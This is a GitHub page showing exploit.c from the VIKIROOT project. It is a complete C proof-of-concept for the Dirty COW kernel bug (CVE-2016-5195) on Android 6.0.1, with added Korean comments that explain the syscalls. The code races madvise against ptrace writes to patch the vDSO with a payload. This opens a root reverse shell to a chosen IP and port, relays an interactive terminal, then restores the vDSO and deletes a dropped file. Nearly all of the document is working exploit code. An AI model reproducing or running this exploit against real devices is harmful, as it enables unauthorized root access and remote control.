Skip to content
Features Business Explore Marketplace Pricing
This repository
Search
Sign in or Sign up
 Watch 20  Star 155  Fork 63 hyln9/VIKIROOT
 Code  Issues 4  Pull requests 0  Projects 0 Insights 
Branch: master Find file Copy pathVIKIROOT/exploit.c
498d85e  on 27 Jan
@hyln9 hyln9 dump before check kernel
1 contributor
RawBlameHistory     
Executable File  647 lines (549 sloc)  15.7 KB
/*
 * CVE-2016-5195 POC FOR ANDROID 6.0.1 MARSHMALLOW
 * 
 * Heavily inspired by https://github.com/scumjr/dirtycow-vdso
 *
 * This file is part of VIKIROOT, https://github.com/hyln9/VIKIROOT
 * 
 * Copyright (C) 2016-2017 Virgil Hou <virgil@zju.edu.cn>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#define _GNU_SOURCE
#include <poll.h>
#include <errno.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <pthread.h>
#include <sys/auxv.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#include "payload.h"

#define VDSO_SIZE 4096

#define DEFAULT_IP            INADDR_LOOPBACK
#define DEFAULT_PORT          1234

#define PATTERN_IP            "\xde\xc0\xad\xde"
#define PATTERN_PORT          "\x37\x13"
#define PATTERN_REMAIN        "\x1f\x20\x03\xd5\x1f\x20\x03\xd5"

#define ARRAY_SIZE(a)         (sizeof(a) / sizeof(a[0]))
#define CHECKSYSCALL(r, name) \
    if((r)==-1){fprintf(stderr,"Syscall error: %s at line %d " \
        "with code %d.\n",name,__LINE__,errno);exit(EXIT_FAILURE);}

struct entry
{
    void *s_pattern;
    size_t s_size;
    void *r_pattern;
    size_t r_size;
};

struct patch
{
    char *name;
    void *patch;
    size_t patch_size;
    void *pattern;
    size_t pattern_size;
    size_t offset;
    bool use_pattern;
    bool use_offset;
};

struct args
{
    bool stop;
    bool is_exploit;
    void *vdso_addr;
    struct patch *vdso_patch;
};

// 16 bytes alignment for stack is required on aarch64
static char child_stack[8192] __attribute__ ((aligned (16)));

static const struct entry const entry_db[] = {
    /* CMP W0, #0; CCMP W0, #1, #4, NE; B.NE #0x50 */
    { "\x1f\x00\x00\x71\x04\x18\x41\x7a\x81\x02\x00\x54", 12,
      "\x1f\x00\x00\x71\x04\x18\x41\x7a", 8 },
};

static void
ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) //ptrace는 리눅스, 유닉스에서 프로세스 디버깅에 사용, lib.s에서 ptrace를 export
																//실제로는 ptrace라는 이름의 커널 시스템콜이 내부적으로 사용된다.
// 사용법 : memcpy ( void * destination, const void * source, size_t num )
// 메모리의 일부분을 복사한다. memcpy 함수의 인자인 source가 가리키는 곳 부터 num 바이트 만큼을 dest가 가리키는 곳에 복사한다.
// 이때 dest와 src의 타입은 모두 위 함수와 무관하다.왜냐하면 이 함수는 단순히 이진 데이터를 복사하는 것이기 때문이다. 또한, 이 함수는 source 의 널 종료 문자(null terminating character) 을 검사하지 않는다. 
//언제나 정확히 num 바이트 만큼을 복사한다. 
//오버플로우 문제를 방지하기 위해 destination 과 source 가 가리키는 배열의 크기는 반드시 num 바이트 이상이여야 하며, 서로 겹치면 안된다. (만일 두 메모리 블록이 겹쳐져 있다면 memmove 함수를 이용하는 것이 현명하다) 

	{
    long value;

    while (n >= sizeof(long)) //n이 4바이트보다 크거나 같을 때
    {
        memcpy(&value, src, sizeof(value)); //src가 가리키는 곳부터 value의 사이즈 만큼을 &value가 가리키는 곳에 복사한다.
        CHECKSYSCALL(ptrace(PTRACE_POKETEXT, pid, dest, value), "ptrace");
		//시스템콜은 응용프로그램에서 운영체제에게 기능을 수행해 달라고 하는 하나의 수단이다.  사용자 스포레서사 소프트웨어 인터럽트를 통해 커널의 기능을 이용하기 위한 서비스를 요청하는 방법
		//syscall()은 시스템 호출의 어셈블리 인터페이스로 첫번째 인자는 시스템콜 (:12)번호이며 그 다음으로 각 시스템콜의 인자가 입력된다.
		//예를들어 open() 시스템 호출을 사용하기 원하면 syscall(SYS_open) 이런식으로 사용.
		//반환 값은 시스템 콜의 리턴 정책에 따라 달라진다. 일반적으로 성공했다면 0, 에러가 발생했다면 -1. 에러코드는 errno에 저장된다.

        n -= sizeof(long); // n = n-4
        dest += sizeof(long); //dest = dest+4
        src += sizeof(long); //src = src+4
    }

    if (n > 0) //syscall이 성공했을 때
    {
        dest -= sizeof(long) - n; //dest = dest - 4 - n

        errno = 0;
        value = ptrace(PTRACE_PEEKTEXT, pid, dest, NULL); //PTRACE_PEEKTEXT : 자식 프로세스 메모리의 addr 위치의 word를 읽고 ptrace 콜의 결과로써
															//워드를 반환한다. 리눅스는 text와 data 주소 공간을 분리하지 않는다. 그래서 두개의 요청은 현재 같다. 
		//사용 법 : ptrace(int request, pid_t pid, caddr_t addr, int data)
        
		if (value == -1 && errno != 0) //value의 값이 -1이고 errono의 값이 0이 아니면 에러 발생
        {
            fprintf(stderr, "Syscall error: ptrace at line %d with code %d.\n",
                __LINE__, errno);
            exit(EXIT_FAILURE);
        }

        memcpy((void *)&value + sizeof(value) - n, src, n);
		//메모리를 복사한다. 데이터가 복사될 곳의 주소(&value+sizeof(value))로 void *형으로 변환되어서 전달된다.
		// src로 부터 n 바이트 만큼 복하된다.
        CHECKSYSCALL(ptrace(PTRACE_POKETEXT, pid, dest, value), "ptrace");
    }

    return;
}

static int
debuggee(void *arg_) 
{
    CHECKSYSCALL(prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0), "prctl");
//prctl 이란 함수는 리눅스 내부에서 프로세스를 관리할 때 사용
//prctl(option, arg2, arg3, arg4, arg5)의 인자형태로 구성
    CHECKSYSCALL(ptrace(PTRACE_TRACEME, 0, NULL, NULL), "ptrace");

    kill(syscall(SYS_getpid), SIGSTOP);

    return 0;
}

static void *
madvise_thread(void *arg_)
{
    struct args *arg = (struct args *)arg_;

    while (!arg->stop)
    {
        CHECKSYSCALL(madvise(arg->vdso_addr, VDSO_SIZE, MADV_DONTNEED), "madvise"); //VDSO_SIZE : 4096
    }

    return NULL;
}

static void *
ptrace_thread(void *arg_)
{
    pid_t pid;
    int flags, status;
    struct args *arg = (struct args *)arg_;

    flags = CLONE_VM|CLONE_PTRACE;
    // 16 bytes alignment for stack is required on aarch64
    pid = clone(debuggee, child_stack + sizeof(child_stack) - 16, flags, arg);
    CHECKSYSCALL(pid, "clone");
    CHECKSYSCALL(waitpid(pid, &status, __WALL), "waitpid");

    while (!arg->stop)
    {
        struct patch *patch = arg->vdso_patch;
        void *data = arg->is_exploit ? patch->patch : patch->pattern;
        size_t sz = arg->is_exploit ? patch->patch_size : patch->pattern_size;
        ptrace_memcpy(pid, arg->vdso_patch->offset + arg->vdso_addr,
                      data, sz);
    }

    CHECKSYSCALL(ptrace(PTRACE_CONT, pid, NULL, NULL), "ptrace"); 
	// ptrace(cmd 데이터쓰기, 읽기, 쓰기, 실행, 재개/ pid는 추적 프로세스의 id/ addr 쓰거나 읽기의 대상이 되는 프로세스의 주소 / data는 쓰여질 정수 값) 
    CHECKSYSCALL(waitpid(pid, NULL, __WALL), "waitpid");

    return NULL;
}

static size_t
match_entry(void *vdso_addr, const struct entry **entry)
{
    const struct entry *e;
    void *entry_point;
    int i;

    for (i = 0; i < ARRAY_SIZE(entry_db); i++)
    {
        e = &entry_db[i];
        if ((entry_point = memmem(vdso_addr, VDSO_SIZE,
                                  e->s_pattern, e->s_size)) != 0)
        {
            *entry = e;
            return entry_point - vdso_addr;
        }
    }

    return 0;
}

static void
optimize_patch(void *addr, size_t len, struct patch *p)
{
	// user_pattern -> True 
    if (p->use_pattern)
    {
        void *target;
        if (p->use_offset)
        {
            void *new_addr = addr + p->offset;
            len -= p->offset;
            if (!(target = memmem(new_addr, len, p->pattern, p->pattern_size)))
            {
                fprintf(stderr, "Patch error: pattern not found "
                    "for patch '%s'.\n", p->name);
                exit(EXIT_FAILURE);
            }
        }
        else
        {// abcdefg -> bcd OK / bce NG
            if (!(target = memmem(addr, len, p->pattern, p->pattern_size))) //memmem(소스주소, 소스 길이, 타겟, 타켓길이) null이 포함된 문자열에서의 검색
																									// memmem이 문자열 addr(길이 = len) 에서 p->pattern 문자열(길이 = p->pattern_size)
            {
                fprintf(stderr, "Patch error: pattern not found "
                    "for patch '%s'.\n", p->name);
                exit(EXIT_FAILURE);
            }
            len -= target + p->pattern_size - addr;
            void *new_addr = target + p->pattern_size;
            if (memmem(new_addr, len, p->pattern, p->pattern_size))
            {
                fprintf(stderr, "Patch error: pattern not unique "
                    "for patch '%s'.\n", p->name);
                exit(EXIT_FAILURE);
            }
            p->use_offset = true;
        }
        p->offset = target - addr;
        p->use_pattern = false;
    }
}

static void
patch_payload(const struct entry *e, uint32_t ip, uint16_t port)
{
    int i;
    struct patch payload_patch[] =
    {
        {
		   "port", // name
			&port, 						// patch
			sizeof(port), 				//patchSize
			PATTERN_PORT,				// pattern
			sizeof(PATTERN_PORT) - 1,	// pattern size
			0, 							// offset
			true, 						// user_pattern
			false 						// user_offset
		 },
        { 
		   "ip", 
	    	&ip, 
		    sizeof(ip), 
		    PATTERN_IP,
            sizeof(PATTERN_IP) - 1, 
		    0, 
		    true, 
		    false 
		},
        { 
		    "remain", 
		    e->r_pattern,
		    e->r_size, 
		    PATTERN_REMAIN,
            sizeof(PATTERN_REMAIN) - 1, 
		    0, 
		    true, 
		    false 
			}
    };
	// array_size = 3
    for (i = 0; i < ARRAY_SIZE(payload_patch); i++)
    {
        optimize_patch(payload, payload_len, &payload_patch[i]);
        struct patch *p = &payload_patch[i];
        memcpy(p->offset + payload, p->patch, p->patch_size);
    }
}

static struct patch*
build_vdso_patch(void *vdso_addr, size_t target_offset, const struct entry *e)
{
    int i;
    uint32_t rel;
    char *dp, *buf;
    struct patch *vdso_patch, *p;

    if ((vdso_patch = malloc(2 * sizeof(struct patch))) == NULL)
    {
        fprintf(stderr, "Resource error: insufficient memory "
                "at line %d.\n", __LINE__);
        exit(EXIT_FAILURE);
    }

    struct patch tmp0 = { "vdso_payload", payload, payload_len, NULL, 0,
                          VDSO_SIZE - payload_len, false, true };

    vdso_patch[0] = tmp0;

    dp = vdso_patch[0].offset + vdso_addr;
    for (i = 0; i < payload_len; i++)
    {
        if (dp[i] != '\x00')
        {
            fprintf(stderr, "Internal error: insufficient place "
                            "for payload.\n");
            exit(EXIT_FAILURE);
        }
    }

    // use 'pattern' to store original copy
    if ((vdso_patch[0].pattern = calloc(payload_len, sizeof(char *))) == NULL)
    {
        fprintf(stderr, "Resource error: insufficient memory "
                "at line %d.\n", __LINE__);
        exit(EXIT_FAILURE);
    }

    vdso_patch[0].pattern_size = payload_len;

    if ((buf = malloc(e->r_size)) == NULL)
    {
        fprintf(stderr, "Resource error: insufficient memory "
                "at line %d.\n", __LINE__);
        exit(EXIT_FAILURE);
    }

    buf[0] = '\xf0';
    buf[1] = '\x03';
    buf[2] = '\x1e';
    buf[3] = '\xaa';

    rel = VDSO_SIZE - payload_len - target_offset - 4;
    *(uint16_t *)&buf[4] = (uint16_t)(rel / 4);
    buf[6] = '\x00';
    buf[7] = '\x94';

    struct patch tmp1 = { "vdso_entry", buf, e->r_size, NULL, 0,
                          target_offset, false, true };

    vdso_patch[1] = tmp1;

    optimize_patch(vdso_addr, VDSO_SIZE, &vdso_patch[0]);
    optimize_patch(vdso_addr, VDSO_SIZE, &vdso_patch[1]);

    if ((vdso_patch[1].pattern = malloc(e->r_size)) == NULL)
    {
        fprintf(stderr, "Resource error: insufficient memory "
                "at line %d.\n", __LINE__);
        exit(EXIT_FAILURE);
    }

    p = &vdso_patch[1];
    vdso_patch[1].pattern_size = e->r_size;
    memcpy(p->pattern, vdso_addr + p->offset, p->pattern_size);

    return vdso_patch;
}

static void
patch_vdso(struct patch *vdso_patch, void *vdso_addr, bool is_exploit)
{
    int i;
    int patch_id;
    struct args arg;
    pthread_t pth1, pth2;
    for (i = 0; i < 2; i++)
    {
        patch_id = is_exploit ? i : 1 - i;
        printf(">>> %s: patch %d/%d\n\n", is_exploit ? "Inject" : "Remove",
                patch_id + 1, 2);

        arg.vdso_patch = &vdso_patch[patch_id];
        arg.vdso_addr = vdso_addr;
        arg.is_exploit = is_exploit;

        arg.stop = false;
        pthread_create(&pth1, NULL, madvise_thread, &arg);
        pthread_create(&pth2, NULL, ptrace_thread, &arg);

        sleep(5);

        arg.stop = true;
        pthread_join(pth1, NULL);
        pthread_join(pth2, NULL);
    }
}

static int
setup_socket(uint16_t port)
{
    struct sockaddr_in addr;
    int enable, s;

    s = socket(AF_INET, SOCK_STREAM, 0);
    CHECKSYSCALL(s, "socket");

    enable = 1;
    CHECKSYSCALL(setsockopt(s, SOL_SOCKET, SO_REUSEADDR,
                            &enable, sizeof(enable)), "setsockopt");

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = port;

    CHECKSYSCALL(bind(s, (struct sockaddr *) &addr, sizeof(addr)), "bind");

    CHECKSYSCALL(listen(s, 1), "listen");

    return s;
}

static int
writeall(int fd, const void *buf, size_t count)
{
    const char *p;
    ssize_t i;

    p = buf;
    do
    {
        i = write(fd, p, count);
        if (i == 0)
        {
            return -1;
        }
        else if (i == -1)
        {
            if (errno == EINTR)
            {
                continue;
            }
            return -1;
        }
        count -= i;
        p += i;
    }
    while (count > 0);

    return 0;
}

static void
term(int s)
{
    struct sockaddr_in addr;
    struct pollfd fds[2];
    socklen_t addr_len;
    char buf[4096];
    nfds_t nfds;
    int c, n;

    printf(">>> Waiting for reverse connect shell.\n\n");

    addr_len = sizeof(addr);
    while (1)
    {
        c = accept(s, (struct sockaddr *)&addr, &addr_len);
        if (c == -1)
        {
            if (errno == EINTR)
            {
                continue;
            }
            fprintf(stderr, "Syscall error: accept at line %d with code %d.\n",
                    __LINE__, errno);
        }
        break;
    }

    close(s);

    printf(">>> Enjoy!\n\n"
           "====================TERMINAL====================\n\n");

    fds[0].fd = STDIN_FILENO;
    fds[0].events = POLLIN;

    fds[1].fd = c;
    fds[1].events = POLLIN;

    nfds = 2;
    while (nfds > 0)
    {
        if (poll(fds, nfds, -1) == -1)
        {
            if (errno == EINTR)
            {
                continue;
            }
            fprintf(stderr, "Syscall error: poll at line %d with code %d.\n",
                    __LINE__, errno);
            break;
        }

        if (fds[0].revents == POLLIN)
        {
            n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n == -1)
            {
                if (errno != EINTR)
                {
                    fprintf(stderr, "Syscall error: read at line %d "
                                    "with code %d.\n",
                            __LINE__, errno);
                    break;
                }
            }
            else if (n == 0)
            {
                break;
            }
            else
            {
                CHECKSYSCALL(writeall(c, buf, n), "write");
            }
        }

        if (fds[1].revents == POLLIN)
        {
            n = read(c, buf, sizeof(buf));
            if (n == -1)
            {
                if (errno != EINTR)
                {
                    fprintf(stderr, "Syscall error: read at line %d "
                                    "with code %d.\n",
                            __LINE__, errno);
                    break;
                }
            }
            else if (n == 0)
            {
                break;
            }
            else
            {
                CHECKSYSCALL(writeall(STDOUT_FILENO, buf, n), "write");
            }
        }
    }
    printf("\n====================TERMINAL====================\n\n");
}

#ifdef DBG
static void
dump(char *filename, void *vdso_addr)
{
    int status;
    pid_t pid = fork(); //자식 프로세스를 생성하고 프로세스 고유 ID를 리턴
						//부모프로세스에게는 자식프로세스의 pid(자식프로세스의 pid)를, 자식 프로세스에게는 0을 리턴
						//프로세스 생성을 실패하면 -1을 리턴
    CHECKSYSCALL(pid, "fork"); //프로세스 생성이 실패인지 성공인지를 확인
    if (pid == 0)
    {
        int fd = open(filename, O_CREAT|O_TRUNC|O_WRONLY, 0644);
        CHECKSYSCALL(fd, "open");
        write(fd, vdso_addr, VDSO_SIZE);
        close(fd);
        exit(EXIT_SUCCESS);
    }
    else
    {
        CHECKSYSCALL(waitpid(pid, &status, 0), "waitpid");
	//pid_t waitpid(pid_t, int * statloc, int options)
	// 리턴값 -> 실패 : -1, 성공 : 0 or 자식 프로세스의 pid 
	//첫번째 인자 : 종료를 확인하고자 하는 자식의 프로세스의 ID를 전달
	//두번째 인자 : 자식 프로세스가 종료되면서 반환한 값을 저장.
    }
}
#endif
	/* 
		./payload 01 02 1111 1111 1111 1222
		argc = 3 
		argv[0] = payload / argv[1] = 01 / argv[2] 02 / --> 전부 문자열
	*/
int main(int argc, char *argv[])
{
	// 변수 선언
    int s;
    bool loc = true;
    size_t target_offset;	// unsig int
    const struct entry *entry;	// 상수화
    struct patch *vdso_patch;

    uint16_t port   = htons(DEFAULT_PORT);  //1234
    uint32_t ip     = htonl(DEFAULT_IP);	// 

    void *vdso_addr = (void *)getauxval(AT_SYSINFO_EHDR);

    if (argc > 3)
    {
        fprintf(stderr, "Command line error: too many options.\n");
        exit(EXIT_FAILURE);
    }
    else if (argc > 1)
    {
        port = htons(atoi(argv[argc - 1]));	// 문자열 -> 숫자 (atoi)	"1234"-> 1234 / 	Default 는 1234 이지만 그XX가 입력한 값으로 바꿔줌
		// ip주소 입력한 한 것을 체크 ( ip주소 형식에 맞는지 )	// 192.168.0.999 -> NG
		// loc 가 0으로 되는 경우는 인자로 값을 2개 넣어준 경우 = ./payload 1234
		if (argc == 3 && (loc = 0, !inet_aton(argv[1], (struct in_addr *)&ip)))
       	{
            fprintf(stderr, "Command line error: invalid IP address.\n");
            exit(EXIT_FAILURE);
        }
    }
    else
    {
        printf("\nCVE-2016-5195 POC FOR ANDROID 6.0.1 MARSHMALLOW\n\n"
               "Usage:\n\n"
               "%s port: use local terminal.\n\n"
               "%s ip port: use remote terminal.\n\n",
               argv[0], argv[0]);
        exit(EXIT_SUCCESS);
    }
	
	// ip 랑 port 출력 ㅗㅗ
    printf("\n>>> Reverse shell target: %s:%d\n\n",
        inet_ntoa(*(struct in_addr *)&ip), ntohs(port));

#ifdef DBG
    dump("vdso_orig.so", vdso_addr);
#endif

    if ((target_offset = match_entry(vdso_addr, &entry)) == 0)
    {
        fprintf(stderr, "Internal error: unknown kernel.\n");
        exit(EXIT_FAILURE);
    }

    patch_payload(entry, ip, port);

    vdso_patch = build_vdso_patch(vdso_addr, target_offset, entry);

    if (loc)
    {
        s = setup_socket(port);
		//성공여부 s에 반환, 자기 시스템 ip+ 입력한 포트로 소켓생성
    }

    printf(">>> Exploit process starts.\n\n");

    patch_vdso(vdso_patch, vdso_addr, true);

#ifdef DBG
    dump("vdso_patched.so", vdso_addr);
#endif

    printf(">>> Please wake up you phone now.\n\n");

    if (loc)
    {
        term(s);
    }
    else
    {
        printf(">>> Restore process will start in 30s.\n\n");
        sleep(30);
    }

    printf(">>> Restore process starts.\n\n");

    patch_vdso(vdso_patch, vdso_addr, false);

    printf(">>> Removing .x file.\n\n");

    if (remove("/data/local/tmp/.x") == -1)
    {
        fprintf(stderr, "Please remove .x manually.\n");
    }

    return EXIT_SUCCESS;
}
Contact GitHub API Training Shop Blog About
© 2017 GitHub, Inc. Terms Privacy Security Status Help